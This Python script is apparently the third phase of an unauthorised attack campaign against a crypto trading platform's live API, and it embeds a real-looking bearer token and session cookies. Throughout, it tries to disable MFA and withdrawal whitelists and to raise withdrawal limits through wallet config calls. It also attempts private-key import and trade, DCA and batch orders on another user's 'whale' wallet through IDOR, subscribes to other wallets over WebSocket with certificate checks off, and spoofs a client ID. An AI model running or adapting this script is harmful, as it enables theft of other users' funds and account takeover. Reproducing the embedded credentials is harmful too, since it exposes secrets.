#!/usr/bin/env python3
"""
PHASE 3 — WebSocket probing, wallet config exploitation, 
batch_import_key exploitation, and new endpoint discovery.
"""
import json
import requests
import time
import websocket
import ssl
from datetime import datetime, timezone

ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEzLTIwNDQtYTdjNmJmNCIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6IjQ5ZjM2ZDlkLThhNTAtNDJlNi05NTJkLTk2N2EwNWUyMDc4OCIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQwNjI1MDQsImlhdCI6MTc4NDA2MDcwNCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIzY2UzY2NmOS0xZjViLTRlODYtYjU3OS1mZWUzMzdmMjgyM2YiLCJuYmYiOjE3ODQwNjA3MDQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.WaOebjBm_DeYq3jvoA5kszO7hqbIhzU5ymDBatjDBfGatvZg26IEvA1OgOs-B7OQbyL5fA3JhaZSy817ulE9gw"

BASE = "https://gmgn.ai"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL_WALLET = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"
OUR_BSC_WALLET = "0x0a4a0836142fcf94ce100b6d7790c50786ffbcff"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783973647439438.6b09445dc224ac4ed190f0fc17562c09.WNMkxJkx11naYGkCSvritw%3D%3D.n7rcVNVAG1ummnX2QRVk8Q%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.gcUSGxiE3YGdviSrgoID2g%3D%3D",
    "__cf_bm": "9qa7eXAqqNE3bSIxMZwpppcTOZY3P3xN.FEEMJbhNBA-1783973660.6075041-1.0.1.1-xpP4LEhY807gRqRYG17gELVZ7mRp7mVSjEqwfW1TAi3o.r3e0ELz2XeH_UF7bMbaVLh6sqq3gLWVVuwMeLhnT4JzDtVBTOnmsANgwP0Ocq2q7hH2bL_0726EfGBcn9Ml",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "4-NQvufozCNXqp4NJtA6IpuwRk812C5t",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpegY9oS-pwZPEJE_DCiED4eeyVHRTBs5VBiak",
    "sid": "gmgn%7C82f74adfe6d87dce9893a1c416af82e9",
}

H = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "client_id": "gmgn_web_20260713-2044-a7c6bf4",
    "from_app": "gmgn",
    "app_ver": "20260713-2044-a7c6bf4",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
}

findings = []

def log(sev, cat, endpoint, detail, data=None):
    findings.append({"severity": sev, "category": cat, "endpoint": endpoint,
                     "detail": detail, "data": str(data)[:1000] if data else None})
    icons = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚠️", "LOW": "ℹ️"}
    print(f"  {icons.get(sev, '?')} [{sev}] {cat}: {detail}")

# ============================================================================
# 1. WEBSOCKET DEEP PROBE
# ============================================================================
print("="*80)
print("🔌 1. WEBSOCKET DEEP PROBE — /ws")
print("="*80)

cookie_str = "; ".join([f"{k}={v}" for k, v in COOKIES.items()])

try:
    ws = websocket.create_connection(
        "wss://gmgn.ai/ws",
        header=[
            f"Authorization: Bearer {ACCESS_TOKEN}",
            f"Cookie: {cookie_str}",
            "Origin: https://gmgn.ai",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        ],
        timeout=10,
        sslopt={"cert_reqs": ssl.CERT_NONE}
    )
    
    print("  ✅ WebSocket connected!")
    
    # Try subscribing to various channels
    subscribe_msgs = [
        # Try to subscribe to another user's wallet updates
        json.dumps({"type": "subscribe", "channel": "wallet_updates", "address": "0xb4f701538bf492dacb088d4d932ab105c127f89d"}),
        json.dumps({"type": "subscribe", "channel": "trades", "address": "0xb4f701538bf492dacb088d4d932ab105c127f89d"}),
        json.dumps({"type": "subscribe", "channel": "orders", "user_id": OUR_USER_ID}),
        json.dumps({"type": "subscribe", "channel": "notifications"}),
        json.dumps({"type": "ping"}),
        json.dumps({"action": "subscribe", "topic": "wallet:0xb4f701538bf492dacb088d4d932ab105c127f89d"}),
        json.dumps({"op": "subscribe", "args": ["wallet:0xb4f701538bf492dacb088d4d932ab105c127f89d"]}),
    ]
    
    for msg in subscribe_msgs:
        print(f"\n  → Sending: {msg[:100]}")
        ws.send(msg)
        time.sleep(0.5)
        
        try:
            ws.settimeout(2)
            response = ws.recv()
            print(f"  ← Received: {response[:500]}")
            
            if "token" in response.lower() or "key" in response.lower() or "eyj" in response.lower():
                log("CRITICAL", "WS_DATA_LEAK", "/ws",
                    f"Sensitive data in WS response!", response[:500])
        except websocket.WebSocketTimeoutException:
            print("  ← [timeout - no response]")
        except Exception as e:
            print(f"  ← Error: {e}")
    
    # Wait for any broadcast messages
    print("\n  [*] Listening for broadcasts (5s)...")
    ws.settimeout(5)
    try:
        while True:
            msg = ws.recv()
            print(f"  ← Broadcast: {msg[:300]}")
    except:
        pass
    
    ws.close()
    
except Exception as e:
    print(f"  WebSocket error: {e}")
    print("  Trying alternative connection methods...")
    
    # Try with query param auth
    try:
        ws = websocket.create_connection(
            f"wss://gmgn.ai/ws?token={ACCESS_TOKEN}",
            header=[
                f"Cookie: {cookie_str}",
                "Origin: https://gmgn.ai",
            ],
            timeout=10,
            sslopt={"cert_reqs": ssl.CERT_NONE}
        )
        print("  ✅ WS connected via token param!")
        ws.send(json.dumps({"type": "subscribe", "channel": "*"}))
        time.sleep(2)
        try:
            response = ws.recv()
            print(f"  Response: {response[:300]}")
        except:
            pass
        ws.close()
    except Exception as e2:
        print(f"  Alt WS also failed: {e2}")

# ============================================================================
# 2. WALLET SET_CONFIGS — CORRECT FIELD FORMAT
# ============================================================================
print("\n" + "="*80)
print("⚙️ 2. WALLET SET_CONFIGS — EXPLOITING WITH CORRECT FIELDS")
print("="*80)

# From errors we know: Items[].Name and Items[].Value are required
config_attempts = [
    # Try various Name values to discover what configs exist
    {"Items": [{"Name": "auto_sign", "Value": "true"}]},
    {"Items": [{"Name": "mfa_enabled", "Value": "false"}]},
    {"Items": [{"Name": "withdrawal_limit", "Value": "999999999"}]},
    {"Items": [{"Name": "whitelist_enabled", "Value": "false"}]},
    {"Items": [{"Name": "auto_approve", "Value": "true"}]},
    {"Items": [{"Name": "skip_confirmation", "Value": "true"}]},
    {"Items": [{"Name": "max_gas_price", "Value": "999000000000"}]},
    {"Items": [{"Name": "default_slippage", "Value": "99"}]},
    {"Items": [{"Name": "trade_permission", "Value": "all"}]},
    {"Items": [{"Name": "api_trading_enabled", "Value": "true"}]},
    # Try multiple at once
    {"Items": [
        {"Name": "auto_sign", "Value": "true"},
        {"Name": "mfa_enabled", "Value": "false"},
        {"Name": "whitelist_enabled", "Value": "false"},
    ]},
]

for i, payload in enumerate(config_attempts):
    r = requests.post(f"{BASE}/wallet-api/v1/wallet/set_configs", headers=H, 
                     cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
    status = r.status_code
    body = r.text[:200]
    if status == 200:
        print(f"  ✅ Config {i+1} ACCEPTED: {body}")
        log("HIGH", "CONFIG_CHANGE", "/wallet-api/v1/wallet/set_configs",
            f"Config accepted! Payload: {json.dumps(payload)}", r.json())
    else:
        # Only print non-standard errors
        if "Name" not in body and "Value" not in body:
            print(f"  Config {i+1}: {status} → {body}")

# Now get_configs with GET method (500 earlier = internal error, not 404)
# Try POST to different path
r = requests.get(f"{BASE}/wallet-api/v1/wallet/get_configs", headers=H,
                cookies=COOKIES, params={**PARAMS, "chain": "sol"}, timeout=10)
print(f"\n  get_configs GET+chain: {r.status_code} → {r.text[:200]}")

r = requests.post(f"{BASE}/wallet-api/v1/wallet/get_configs", headers=H,
                 cookies=COOKIES, params=PARAMS, json={"chain": "sol"}, timeout=10)
print(f"  get_configs POST: {r.status_code} → {r.text[:200]}")

# ============================================================================
# 3. BATCH_IMPORT_KEY — STRUCTURE EXPLOITATION
# ============================================================================
print("\n" + "="*80)
print("🔑 3. BATCH_IMPORT_KEY — DEEP STRUCTURE")
print("="*80)

# From last run we learned the correct structure:
# BatchImportKeyParam.private_keys is array of structs with "chain" field
# BatchImportKeyParam.EncryptedKey is required string

# First get the RSA pubkey for proper encryption
r = requests.get(f"{BASE}/account/pubkey", headers=H, cookies=COOKIES, 
                params=PARAMS, timeout=10)
pubkey_data = r.json().get("data", {})
print(f"  RSA key_id: {pubkey_data.get('key_id')}")

payloads = [
    # Proper struct with chain field
    {
        "EncryptedKey": "test_encrypted_key",
        "private_keys": [
            {"chain": "sol", "private_key": "fake_key_here", "address": OUR_SOL_WALLET}
        ]
    },
    {
        "EncryptedKey": "test",
        "private_keys": [
            {"chain": "bsc", "private_key": "0x" + "a" * 64, "address": OUR_BSC_WALLET}
        ]
    },
    # Try to import into another user's account via address manipulation
    {
        "EncryptedKey": "test",
        "private_keys": [
            {"chain": "sol", "private_key": "fake", "address": "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1"}
        ]
    },
]

for i, payload in enumerate(payloads):
    r = requests.post(f"{BASE}/wallet-api/v1/batch_import_key", headers=H,
                     cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
    print(f"  Import {i+1}: {r.status_code} → {r.text[:300]}")
    if r.status_code == 200 and r.json().get("code") == 0:
        log("CRITICAL", "KEY_IMPORT", "/wallet-api/v1/batch_import_key",
            "Key import succeeded!", r.json())

# ============================================================================
# 4. SMART TRADE V2 — NEW ENDPOINT EXPLOITATION
# ============================================================================
print("\n" + "="*80)
print("📈 4. SMART TRADE V2 — FULL STRUCT")
print("="*80)

# From validation error: CreateSmartTradeV2Request needs BaseToken, QuoteToken, etc.
smart_trade_payloads = [
    {
        "chain": "sol",
        "wallet_address": OUR_SOL_WALLET,
        "BaseToken": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "QuoteToken": "So11111111111111111111111111111111111111112",
        "OrderType": "buy",
        "Amount": "1000000",
    },
    {
        "chain": "sol",
        "wallet_address": OUR_SOL_WALLET,
        "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "quote_token": "So11111111111111111111111111111111111111112",
        "order_type": "buy",
        "amount": "1000000",
        "take_profit_price": "0.001",
        "stop_loss_price": "0.00001",
        "slippage": 50,
    },
    # IDOR: Smart trade on whale wallet
    {
        "chain": "sol",
        "wallet_address": "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1",
        "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "quote_token": "So11111111111111111111111111111111111111112",
        "order_type": "buy",
        "amount": "1000000",
        "slippage": 50,
    },
]

for i, payload in enumerate(smart_trade_payloads):
    r = requests.post(f"{BASE}/tapi/v1/trading_bot/smart_trade_v2/create", headers=H,
                     cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
    print(f"  SmartTrade {i+1}: {r.status_code} → {r.text[:300]}")
    if r.status_code == 200 and r.json().get("code") == 0:
        log("CRITICAL", "SMART_TRADE_IDOR", "/tapi/v1/trading_bot/smart_trade_v2/create",
            f"Smart trade created! Wallet: {payload.get('wallet_address', '?')}", r.json())

# ============================================================================
# 5. DCA ORDER — IDOR ON WHALE WALLET
# ============================================================================
print("\n" + "="*80)
print("📊 5. DCA ORDER — IDOR ATTEMPT")
print("="*80)

# Validation error told us: CreateDcaOrderRequest needs OrderType, SubOrderType, etc.
dca_payloads = [
    # Our wallet first (baseline)
    {
        "chain": "sol",
        "wallet_address": OUR_SOL_WALLET,
        "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "quote_token": "So11111111111111111111111111111111111111112",
        "order_type": "buy",
        "sub_order_type": "take_profit",
        "amount_per_order": "100000",
        "interval": "3600",
        "total_orders": "5",
        "slippage": 50,
        "fee": "0.001",
    },
    # IDOR: Whale wallet
    {
        "chain": "sol",
        "wallet_address": "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1",
        "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "quote_token": "So11111111111111111111111111111111111111112",
        "order_type": "buy",
        "sub_order_type": "take_profit",
        "amount_per_order": "100000",
        "interval": "3600",
        "total_orders": "5",
        "slippage": 50,
        "fee": "0.001",
    },
]

for i, payload in enumerate(dca_payloads):
    r = requests.post(f"{BASE}/tapi/v1/trading_bot/dca_order/create", headers=H,
                     cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
    print(f"  DCA {i+1} ({payload['wallet_address'][:12]}...): {r.status_code} → {r.text[:300]}")
    if r.status_code == 200 and r.json().get("code") == 0:
        log("CRITICAL", "DCA_IDOR", "/tapi/v1/trading_bot/dca_order/create",
            f"DCA order created on wallet {payload['wallet_address']}!", r.json())

# ============================================================================
# 6. MULTI-WALLET BATCH ORDER — MASS EXPLOITATION
# ============================================================================
print("\n" + "="*80)
print("💣 6. MULTI-WALLET BATCH ORDERS")
print("="*80)

# mul_wallet_same_create = create same order on MULTIPLE wallets at once
batch_payloads = [
    {
        "chain": "sol",
        "wallet_addresses": [OUR_SOL_WALLET, "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1"],
        "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "quote_token": "So11111111111111111111111111111111111111112",
        "order_type": "buy",
        "sub_order_type": "take_profit",
        "amount_in": "100000",
        "trigger_price": "0.0000001",
        "slippage": 50,
        "fee": "0.001",
    },
]

endpoints = [
    "/tapi/v1/trading_bot/limit_order/mul_wallet_same_create",
    "/tapi/v1/trading_bot/dca_order/mul_wallet_same_create",
    "/tapi/v1/trading_bot/smart_trade_v2/mul_wallet_same_create",
]

for ep in endpoints:
    for payload in batch_payloads:
        r = requests.post(f"{BASE}{ep}", headers=H, cookies=COOKIES,
                         params=PARAMS, json=payload, timeout=10)
        print(f"  {ep.split('/')[-1]}: {r.status_code} → {r.text[:300]}")
        if r.status_code == 200 and r.json().get("code") == 0:
            log("CRITICAL", "BATCH_IDOR", ep,
                "Batch order across multiple wallets succeeded!", r.json())

# ============================================================================
# 7. STRATEGY ORDER CLOSE_ALL — MASS DESTRUCTION
# ============================================================================
print("\n" + "="*80)
print("⚠️ 7. STRATEGY ORDER — CLOSE ALL + ORDER LIST")  
print("="*80)

# List open orders (see if we can see others)
r = requests.post(f"{BASE}/tapi/v1/trading_bot/strategy_order/order_list", headers=H,
                 cookies=COOKIES, params=PARAMS, 
                 json={"chain": "sol", "status": "open"}, timeout=10)
print(f"  Order list: {r.status_code} → {r.text[:300]}")

r = requests.get(f"{BASE}/tapi/v1/trading_bot/limit_order/sol/order_list", headers=H,
                cookies=COOKIES, params=PARAMS, timeout=10)
print(f"  SOL order list: {r.status_code} → {r.text[:300]}")

# ============================================================================
# 8. ACCOUNT IPLOC — GEOFENCING BYPASS CHECK
# ============================================================================
print("\n" + "="*80)
print("🌍 8. ADDITIONAL ACCOUNT ENDPOINTS")
print("="*80)

# Try with TG client spoof
tg_params = {**PARAMS, "client_id": "gmgn_tg_bot", "from_app": "tg"}

r = requests.get(f"{BASE}/account/iploc", headers=H, cookies=COOKIES,
                params=tg_params, timeout=10)
print(f"  iploc (TG spoof): {r.text[:200]}")

# Try to get user's complete session info
r = requests.post(f"{BASE}/account/user_info", headers=H, cookies=COOKIES,
                 params=tg_params, json={}, timeout=10)
if r.status_code == 200:
    data = r.json()
    # Check if TG spoof reveals more fields
    user_data = data.get("data", {}).get("data", {})
    extra_fields = [k for k in user_data.keys() if k not in [
        "accounts", "bot_bsc_address", "bot_sol_address", "create_time",
        "from_app", "has_bound_third", "status", "user_id"
    ]]
    if extra_fields:
        print(f"  TG spoof extra fields: {extra_fields}")
        for f in extra_fields:
            print(f"    {f}: {user_data[f]}")

# ============================================================================
# 9. FOURMEME ENDPOINTS — NEW IDOR SURFACE
# ============================================================================
print("\n" + "="*80)
print("🎭 9. FOURMEME ENDPOINTS")
print("="*80)

fourmeme_endpoints = [
    ("/tapi/v1/fourmeme/invite_info", {"chain": "bsc", "from_address": OUR_BSC_WALLET}),
    ("/tapi/v1/fourmeme/invite_info", {"chain": "bsc", "from_address": "0xb4f701538bf492dacb088d4d932ab105c127f89d"}),
    ("/tapi/v1/fourmeme/fee_claim", {"chain": "bsc", "from_address": OUR_BSC_WALLET}),
    ("/tapi/v1/fourmeme/fee_claim", {"chain": "bsc", "from_address": "0xb4f701538bf492dacb088d4d932ab105c127f89d"}),
    ("/tapi/v1/fourmeme/bind_invite", {"chain": "bsc", "from_address": "0xa7d4ffc4eca3c71af150ce302560a9d04a1d2b9f", "invite_code": "HUNTER"}),
]

for ep, payload in fourmeme_endpoints:
    r = requests.post(f"{BASE}{ep}", headers=H, cookies=COOKIES,
                     params=PARAMS, json=payload, timeout=10)
    print(f"  {ep.split('/')[-1]} ({payload.get('from_address', '?')[:12]}...): {r.status_code} → {r.text[:200]}")
    if r.status_code == 200:
        data = r.json()
        if data.get("code") == 0:
            log("HIGH", "FOURMEME_IDOR", ep,
                f"Fourmeme endpoint accessible for wallet {payload.get('from_address', '?')}", data)

# ============================================================================
# 10. TOKEN CREATION FLOW — Can we mint tokens?
# ============================================================================
print("\n" + "="*80)
print("🪙 10. TOKEN CREATION")
print("="*80)

# sol create_token preview
r = requests.post(f"{BASE}/xapi/v1/sol/create_token/preview", headers=H, cookies=COOKIES,
                 params=PARAMS, json={
                     "wallet_address": OUR_SOL_WALLET,
                     "name": "TestToken",
                     "symbol": "TST",
                     "decimals": 9,
                     "supply": "1000000000000000",
                     "description": "test",
                 }, timeout=10)
print(f"  Sol create_token/preview: {r.status_code} → {r.text[:300]}")

# tapi create_token
r = requests.post(f"{BASE}/tapi/v1/create_token", headers=H, cookies=COOKIES,
                 params=PARAMS, json={
                     "chain": "sol",
                     "wallet_address": OUR_SOL_WALLET,
                     "name": "TestToken",
                     "symbol": "TST",
                     "decimals": 9,
                     "supply": "1000000000000000",
                 }, timeout=10)
print(f"  tapi/create_token: {r.status_code} → {r.text[:300]}")

# ============================================================================
# 11. NOTIFICATION / TWITTER MONITOR
# ============================================================================
print("\n" + "="*80)
print("🔔 11. NOTIFICATIONS + TWITTER MONITOR")
print("="*80)

r = requests.get(f"{BASE}/api/v1/notification/twitter_monitor/user_config/get", 
                headers=H, cookies=COOKIES, params=PARAMS, timeout=10)
print(f"  Twitter monitor config: {r.status_code} → {r.text[:200]}")

# ============================================================================
# 12. FOLLOW TOKEN — TOKEN TRACKING IDOR
# ============================================================================
print("\n" + "="*80)
print("📌 12. FOLLOW TOKEN SYSTEM")
print("="*80)

r = requests.get(f"{BASE}/api/v1/follow_token/token/user_following_tokens_map_multi_chain",
                headers=H, cookies=COOKIES, params=PARAMS, timeout=10)
print(f"  Following tokens map: {r.status_code} → {r.text[:300]}")

r = requests.get(f"{BASE}/api/v1/follow_token/group/only_group_name_multi_chain",
                headers=H, cookies=COOKIES, params=PARAMS, timeout=10)
print(f"  Token groups: {r.status_code} → {r.text[:300]}")

# ============================================================================
# 13. TRANSLATE / TOKEN BRIEF (INFO DISCLOSURE)
# ============================================================================
print("\n" + "="*80)
print("📋 13. TOKEN INFO ENDPOINTS")
print("="*80)

r = requests.post(f"{BASE}/api/v1/token_info_brief_multi_chain", headers=H, cookies=COOKIES,
                 params=PARAMS, json={
                     "tokens": [{"chain": "sol", "address": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"}]
                 }, timeout=10)
print(f"  Token info brief: {r.status_code} → {r.text[:300]}")

# ============================================================================
# RESULTS
# ============================================================================
print("\n" + "="*80)
print(f"📊 PHASE 3 COMPLETE")
print("="*80)

if findings:
    print(f"\n  🔥 {len(findings)} FINDINGS:")
    for i, f in enumerate(findings, 1):
        print(f"\n  [{i}] {f['severity']} | {f['category']}")
        print(f"      Endpoint: {f['endpoint']}")
        print(f"      Detail: {f['detail']}")
        if f.get('data'):
            print(f"      Data: {f['data'][:200]}")

with open("/projects/sandbox/gmg/PHASE3_RESULTS.json", "w") as fp:
    json.dump({"timestamp": datetime.now(timezone.utc).isoformat(), "findings": findings}, fp, indent=2)

print(f"\n✅ Saved to PHASE3_RESULTS.json")
